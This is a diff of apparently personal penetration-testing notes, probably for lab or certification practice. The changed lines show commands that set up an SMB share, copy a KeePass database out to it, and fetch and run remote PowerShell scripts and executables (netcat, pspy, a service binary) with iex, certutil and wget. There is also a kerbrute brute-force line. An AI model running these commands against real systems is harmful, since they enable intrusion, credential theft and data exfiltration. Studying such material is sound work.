@@ -50,9 +50,10 @@ cat combined.txt| /opt/kerbrute bruteforce -d $dom --dc $ip -t 10 -
 Transfer files.
 
 ```bash
-impacket-smbserver -username wow -password wow share . -smb2support
-net use \\$myip\share /u:wow wow
-copy \\$myip\share\file .
+impacket-smbserver -smb2support newShare . -username test -password test
+net use z: \\192.168.45.238\newShare /u:test test
+copy z:\PowerUpSQL.ps1 .
+copy Database.kdbx z:\
 ```
 
 ```bash
@@ -67,8 +68,8 @@ iex(iwr -uri 192.168.49.129:8000/transfer_files.ps1 -usebasicparsing)
 iwr -uri 192.168.45.238:8000/Certify.exe -usebasicparsing -outfile c:\windows\tasks\Certify.exe
 
 iex(iwr -uri 10.10.112.153:1234/transfer_files_ad.ps1 -usebasicparsing)
-certutil.exe -f -urlcache -split http://192.168.49.129:8000/nc.exe nc.exe
-
+certutil.exe -f -urlcache -split http://192.168.45.238:8000/svc_mssql443.exe svc_mssql443.exe
+wget http://192.168.45.238:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;
 certutil.exe -f -urlcache -split http://192.168.45.187:8000/
 
 # Uploaded nc.exe from /usr/share/windows-resources/binaries/nc.exe
